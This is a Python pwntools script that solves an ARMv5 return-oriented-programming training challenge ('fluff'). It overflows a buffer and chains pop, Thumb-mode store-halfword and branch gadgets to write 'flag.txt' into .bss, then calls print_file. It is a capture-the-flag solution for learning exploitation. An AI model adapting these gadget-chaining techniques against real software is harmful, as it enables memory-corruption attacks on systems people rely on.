from pwn import *

FLAG = b"flag.txt"

elf = context.binary = ELF("fluff_armv5-hf")
r = elf.process()

# ========== GADGETS ==========

pop_r1245678_ip_lr_pc	= p32(0x10634) # pop {r1, r2, r4, r5, r6, r7, r8, ip, lr, pc}
strh_r0_r7_bx_lr		= p32(0x10638 + 1) # [THUMB MODE] strh r0, [r7, #0x1e] ; nop ; lsrs r6, r5, #3 ; movs r1, r0 ; lsrs r4, r4, #3 ; movs r1, r0 ; bx lr
pop_r013_bx_r1			= p32(0x105ec) # pop {r0, r1, r3} ; bx r1
bx_r1					= p32(0x105f0) # bx r1
bss_address				= 0x21124 # where we will write "flag.txt"

# ========== ROP ==========

rop = b'A' * 36
rop += pop_r013_bx_r1

for i in range(0, len(FLAG), 2):
	rop += FLAG[i:i+2] + b'\0\0'
	rop += pop_r1245678_ip_lr_pc
	rop += p32(0)

	rop += strh_r0_r7_bx_lr # r1 = strh_r0_r7_bx_lr in thumb mode
	rop += p32(0) * 4
	rop += p32(bss_address + i - 0x1e)
	rop += p32(0) * 2
	rop += pop_r013_bx_r1
	rop += bx_r1

rop += p32(bss_address)
rop += p32(elf.sym['print_file'])
rop += p32(0)

r.sendline(rop)
print(r.recvall().decode().strip())
